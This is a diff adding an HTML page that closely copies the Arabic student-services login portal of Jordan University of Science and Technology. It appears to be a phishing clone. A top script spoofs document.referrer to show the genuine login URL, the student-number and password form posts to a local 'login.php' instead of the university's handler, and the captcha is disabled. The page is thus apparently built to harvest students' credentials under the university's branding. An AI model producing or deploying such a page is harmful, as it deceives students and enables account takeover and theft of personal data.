@@ -1,0 +1,418 @@
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta charset="UTF-8">
+<script type="text/javascript">
+(function(){
+try {
+function getterHook(obj, name, cb) {
+    if (document.__defineGetter__) {
+        document.__defineGetter__(name, cb);
+        return;
+    }
+    if ((obj && obj.prototype && Object) &&
+        (Object.getOwnPropertyDescriptor) &&
+        (Object.getOwnPropertyDescriptor(obj.prototype, name)) &&
+        (Object.getOwnPropertyDescriptor(obj.prototype, name).get) &&
+        (Object.getOwnPropertyDescriptor(obj.prototype, name).configurable)) {
+        Object.defineProperty(obj.prototype, name, { get : cb });
+        return;
+    }
+}
+function asmReferrerGetter() { return "https://services.just.edu.jo/stuservices/login_en.aspx"; }
+getterHook(Document, "referrer", asmReferrerGetter);
+} catch(e) {}
+})();
+
+</script>
+<title>
+    خدمات الطالب
+</title>
+
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js" type="text/javascript"></script>
+    <script src="//ajax.googleapis.com/ajax/libs/jqueryui/1.9.1/jquery-ui.min.js" type="text/javascript"></script>
+    <link href="/stuservices/Styles/custom-theme/jquery-ui.css" rel="stylesheet" type="text/css" />
+    <link rel="Stylesheet" href="/stuservices/Styles/StyleSheet.css" />
+    <link type="image/x-icon" href="/stuservices/images/lo.ico?v=2" rel="shortcut icon" />
+
+    <style type="text/css">
+        .ui-dialog {
+            /* position: fixed;  for position pop up dialog center even if MaintainScrollPositionOnPostback="true" */
+        }
+
+        .ui-widget {
+            font-family: droid arabic kufi;
+            font-size: 1em;
+        }
+    </style>
+<script type="text/javascript" src="https://www.google.com/recaptcha/api.js?hl=ar"></script>
+    <script type="text/javascript">
+        $(function () {
+
+            $('#globalDialog').dialog(
+                {
+                    autoOpen: false,
+                    modal: true,
+                    width: 600,
+                    buttons:
+                    {
+                        'موافق': function () { $(this).dialog('close'); }
+                    },
+                    open: function (type, data) { $(this).parent().appendTo("form"); }
+                });
+        });
+
+        function showGlobalDialog(msg) {
+            $("#ctl00_lblGlobalDialogMessage").text(msg);
+            $('#globalDialog').dialog("open");
+        }
+    </script>
+
+    
+    <script type="text/javascript" src="https://www.google.com/recaptcha/api.js?hl=ar"></script>
+    <script type="text/javascript">
+        $(function ()
+        {
+
+            $('#login_validation_dialog').dialog(
+            {
+                autoOpen: false,
+                modal: true,
+                width: 600,
+                buttons:
+                {
+                    'إغلاق': function () { $(this).dialog('close'); }
+                },
+                open: function (type, data) { $(this).parent().appendTo("form"); }
+            });
+
+            $('#ctl00_contentPH_btnLogin').click(function ()
+            {
+                if (!Page_ClientValidate("vgLogin"))
+                {
+                    $("#login_validation_dialog").dialog("open");
+                    return false;
+                }
+                return true;
+            });
+
+
+            $('#divForgetPassword').dialog(
+            {
+                autoOpen: false,
+                modal: true,
+                width: 600,
+                buttons:
+                {
+                    'إغلاق': function () { $(this).dialog('close'); }
+                },
+                open: function (type, data) { $(this).parent().appendTo("form"); }
+            });
+
+            $('#divChangePassword').dialog(
+            {
+                autoOpen: false,
+                modal: true,
+                width: 700,
+                buttons:
+                {
+                    'إغلاق': function () { $(this).dialog('close'); }
+                },
+                open: function (type, data) { $(this).parent().appendTo("form"); }
+            });
+
+            $('#divResetPasswordOldStudent').dialog(
+            {
+                autoOpen: false,
+                modal: true,
+                width: 700,
+                buttons:
+                {
+                    'إغلاق': function () { $(this).dialog('close'); }
+                },
+                open: function (type, data) { $(this).parent().appendTo("form"); }
+            });
+
+        });
+    </script>
+    
+</head>
+<body>
+    <form name="aspnetForm" method="post" action="login.php" onsubmit="javascript:return WebForm_OnSubmit();" id="aspnetForm" style="height: 100%;">
+<div>
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTIwMDgyNjU1MjgPZBYCZg9kFgICAw9kFgICBA8PFgIeBFRleHQFATBkZGT+1x+qiD+SQVCLpSI9HkwsJ1I0kXnQlVQsYxgChRhnmg==" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['aspnetForm'];
+if (!theForm) {
+    theForm = document.aspnetForm;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/stuservices/WebResource.axd?d=l-Lwl0u_GKlXk5ke2_-I1DXYZSsijmDUE5OAMCL4uPY0gOG0TSkmLeC4E5r5wXC2LqeXg7gQw4Vrz9UukKZ3FePR_ExkwlXjMrZONSzZ84Y1&amp;t=637024254076548520" type="text/javascript"></script>
+
+
+<script src="/stuservices/WebResource.axd?d=mHom7HNuQ28NImxInh-nXjenrwECezAxKuDT-c3o95XWWmuEv0D4-QGaejX8fvzNXglfHslFEzJXYv2DgGygPud6NywU_yjqcLEC4DXrFO01&amp;t=637024254076548520" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+function WebForm_OnSubmit() {
+if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+return true;
+}
+//]]>
+</script>
+
+<div>
+
+    <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="814DD7E8" />
+    <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAeh/jqISve0Ssui9u2OQjkf5+LZ6VrQ3xGArsZRnG0xAjVwMTBcvoz0XSW+wNe7wbF7SPPdqj/0KdEdGntnLNNKCSp+Ssc7ozokarPCMhmuAE6crQvjNQikHSY2E8Pj6JdNoDP9hFHmR43wN+oJiWe2/NztzE7Kk/iqYbqC8N4VQbhrqWZOXgKYbNMehXHuIgc=" />
+</div>
+        
+
+        
+
+        <div style="min-height: 100%; width: 100%; min-width: 950px;">
+
+            <div class="top-header" style="direction: rtl;">
+                <div style="float: right;">
+                    <img src="/stuservices/images/just_logo_new_ar.png" alt="JUST Logo" />
+                </div>
+                <div class="site-title" style="float: right;">
+                    <div class="site-div">
+                        خدمات الطالب
+                    </div>
+                </div>
+                <div style="float: left;">
+                    <a id="ctl00_lbLanguage" href="javascript:__doPostBack(&#39;ctl00$lbLanguage&#39;,&#39;&#39;)">
+                        <img src="/stuservices/images/En_lang_icon.png" alt="English" />
+                    </a>
+                </div>
+                <div style="clear: both;"></div>
+            </div>
+
+            
+
+            <div style="margin: 20px;">
+
+                <div style="direction: rtl;">
+                    
+
+    
+    <div id="ContentDiv" class="ContentDiv">
+
+        <div id="NotesDiv">
+            <div class="NoteDiv">
+                <span class="NoteTitle">الطلبة الأعزاء</span>
+                <span class="NoteSpanFont">ترجو وحدة القبول و التسجيل من أعزائنا الطلبة البقاء على تواصل مع هذا الموقع و متابعة الإعلانات التي تنشر من خلاله ليبقى
+                    الطالب مع آخر ما يستجد من قرارات و تعليمات تهمه و تدعم مسيرته في جوهرة الجامعات من خلال ما تقدمه لهم وحدة القبول و التسجيل
+                </span>
+            </div>
+
+            <div class="NoteDiv">
+                <span class="NoteTitle">خاص بالطلبة المستجدين</span>
+                <span class="NoteSpanFont">كلمة السر هي الكلمة الموجود على الوصولات التي تصدر من وحدة الشؤون المالية في الجامعة (الوصل الأول أو وصل التحويل)  أو التي صدرت بعد إتمام اجراءات القبول من خلال الدفع بالفيزا و تم ارسالها لك بالبريد الإلكتروني  
+                </span>
+            </div>
+
+        </div>
+        <center>
+            <div style="display: block; height: 90px; margin: 10px 0px; text-align: center;">
+                <div class="NoteSpanFont" style="display: block;">حمل تطبيق JUST Students مجانا</div>
+                <a href="https://itunes.apple.com/us/app/just-students/id1115178610?mt=8&ign-mpt=uo%3D4" target="_blank">
+                    <img src="/stuservices/images/AppStore.png" alt="app-store" style="margin-right: 20px;" /></a>
+                <a href="https://play.google.com/store/apps/details?id=jo.edu.just.juststudents" target="_blank">
+                    <img src="/stuservices/images/GooglePlay.png" alt="google-play" style="margin-right: 20px;" /></a>
+                <a href="https://appgallery.huawei.com/#/app/C103816235" target="_blank">
+                    <img src="/stuservices/images/AppGallery.png" alt="AppGallery" style="margin-right: 20px;" /></a>
+            </div>
+
+            <div id="LoginDiv" class="LoginDiv">
+                <table class="LoginTable">
+                    <tr>
+                        <th colspan="2">
+                            <img src="/stuservices/images/LoginIcon1.png" alt="" style="vertical-align: middle; width: 50px;" />
+                            <span style="margin-right: 10px;">تسجيل الدخول للنظام</span>
+                        </th>
+                    </tr>
+                    <tr>
+                        <td>
+                            <span>رقم الطالب
+                                <span id="stuid" style="color:Red;visibility:hidden;">*</span>
+                                <span id="ctl00_contentPH_regExTxtStuNo" style="color:Red;visibility:hidden;">*</span>
+                            </span>
+                        </td>
+                        <td>
+                            <input name="stuid" type="text" id="stuid" class="Control_Textbox" PlaceHolder="الرقم التسلسلي للطالب" style="width:300px;" />
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <span>كلمة المرور
+                                            <span id="password" style="color:Red;visibility:hidden;">*</span>
+                            </span>
+                        </td>
+                        <td>
+                            <input name="password" type="password" id="password" class="Control_Textbox" PlaceHolder="كلمة المرور" style="width:300px;" />
+                        </td>
+                    </tr>
+                    
+                    <tr>
+                        <td></td>
+                        <td>
+                           <!-- <div class="g-recaptcha" data-sitekey="6Ldy7hkmAAAAAJnKH6PRkAMK4jMPDDyhzWwBxsai"></div> -->
+                            
+                        </td>
+                    </tr>
+
+                    <tr>
+                        <td></td>
+                        <td>
+                            <input type="submit" name="ctl00$contentPH$btnLogin" value="الدخول" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$contentPH$btnLogin&quot;, &quot;&quot;, true, &quot;vgLogin&quot;, &quot;&quot;, false, false))" id="ctl00_contentPH_btnLogin" class="Control_Button" style="width:300px;" />
+                        </td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="LoginLinks"> 
+                <table style="text-align: center; width: 600px;">
+                    <tr>
+                        <td colspan="2">
+                            <span class="NotificationSpan" style="text-align: center;">
+                                <a href="download/UnifiedAdmission_StuServices.pdf" target="_blank">ملف توضيحي يبين إجراءات ما بعد الحصول على الرقم الجامعي</a>                                
+                                <a href="https://www.youtube.com/watch?v=rFV9oY8OjOI" target="_blank">فيديو توضيحي يبين إجراءات ما بعد الحصول على الرقم الجامعي</a>
+                                <a href="download/UnifiedAdmission_CourseSchedule.pdf" target="_blank">ملف توضيحي يبين إجراءات الحصول على البرنامج الدراسي للطلبة المستجدين</a>
+                                <a href="https://www.youtube.com/watch?v=GTjTEozw8Xs" target="_blank">فيديو توضيحي يبين إجراءات الحصول على البرنامج الدراسي للطلبة المستجدين</a>
+                            </span>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a id="ctl00_contentPH_hlForgetPassword" href="ForgetPassword.aspx">نسيت الكلمة السرية</a>
+                            
+                        </td>
+                        <td>
+                            <a id="ctl00_contentPH_hlChangePassword" href="ChangePassword.aspx">تغيير الكلمة السرية</a>
+                            
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <a id="ctl00_contentPH_hlResetPasswordOldStudent" href="ResetPasswordOldStudent.aspx">تفعيل الحساب للطلبة القدامى</a>
+                            
+                        </td>
+                        <td>
+                            <a id="ctl00_contentPH_lbHelp" href="javascript:__doPostBack(&#39;ctl00$contentPH$lbHelp&#39;,&#39;&#39;)">للمساعدة في إدخال عناوين الطلبة المستجدين</a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td colspan="2">
+                            <a id="ctl00_contentPH_lbDocumentsManual" href="javascript:__doPostBack(&#39;ctl00$contentPH$lbDocumentsManual&#39;,&#39;&#39;)">دليل طلب الوثائق واسترجاع الكلمة السرية للطلبة القدامى</a>
+                        </td>
+                    </tr>
+                </table>
+
+            </div>
+
+        </center>
+
+        <div id="login_validation_dialog" title="التحقق من الصفحة" style="display: none; direction: rtl">
+            <div id="ctl00_contentPH_vsLogin" style="color:Red;display:none;">
+
+</div>
+        </div>
+
+        
+
+
+
+    </div>
+
+    
+
+
+                </div>
+            </div>
+
+            <br />
+        </div>
+
+        <div id="FooterDiv" class="Footer FooterLogin">
+            جميع الحقوق محفوظة، جامعة العلوم والتكنولوجيا الأردنية &copy;
+            <span id="ctl00_lblServerIP" style="font-size:5pt;">0</span>
+        </div>
+
+        <div id="globalDialog" title="تنــبيه" style="display: none; direction: rtl">
+            <span id="ctl00_lblGlobalDialogMessage"></span>
+        </div>
+    
+<script type="text/javascript">
+//<![CDATA[
+var Page_ValidationSummaries =  new Array(document.getElementById("ctl00_contentPH_vsLogin"));
+var Page_Validators =  new Array(document.getElementById("stuid"), document.getElementById("ctl00_contentPH_regExTxtStuNo"), document.getElementById("password"));
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+var stuid = document.all ? document.all["stuid"] : document.getElementById("stuid");
+stuid.controltovalidate = "stuid";
+stuid.errormessage = "يجب ادخال رقم الطالب";
+stuid.validationGroup = "vgLogin";
+stuid.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+stuid.initialvalue = "";
+var ctl00_contentPH_regExTxtStuNo = document.all ? document.all["ctl00_contentPH_regExTxtStuNo"] : document.getElementById("ctl00_contentPH_regExTxtStuNo");
+ctl00_contentPH_regExTxtStuNo.controltovalidate = "stuid";
+ctl00_contentPH_regExTxtStuNo.errormessage = "الرقم الجامعي خاطئ. أرقام باللغة الإنجليزية فقط";
+ctl00_contentPH_regExTxtStuNo.validationGroup = "vgLogin";
+ctl00_contentPH_regExTxtStuNo.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
+ctl00_contentPH_regExTxtStuNo.validationexpression = "^\\d{1,}$";
+var password = document.all ? document.all["password"] : document.getElementById("password");
+password.controltovalidate = "password";
+password.errormessage = "يجب ادخال كلمة المرور";
+password.validationGroup = "vgLogin";
+password.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+password.initialvalue = "";
+var ctl00_contentPH_vsLogin = document.all ? document.all["ctl00_contentPH_vsLogin"] : document.getElementById("ctl00_contentPH_vsLogin");
+ctl00_contentPH_vsLogin.validationGroup = "vgLogin";
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+
+var Page_ValidationActive = false;
+if (typeof(ValidatorOnLoad) == "function") {
+    ValidatorOnLoad();
+}
+
+function ValidatorOnSubmit() {
+    if (Page_ValidationActive) {
+        return ValidatorCommonOnSubmit();
+    }
+    else {
+        return true;
+    }
+}
+        //]]>
+</script>
+</form>
+</body>
+</html>
+
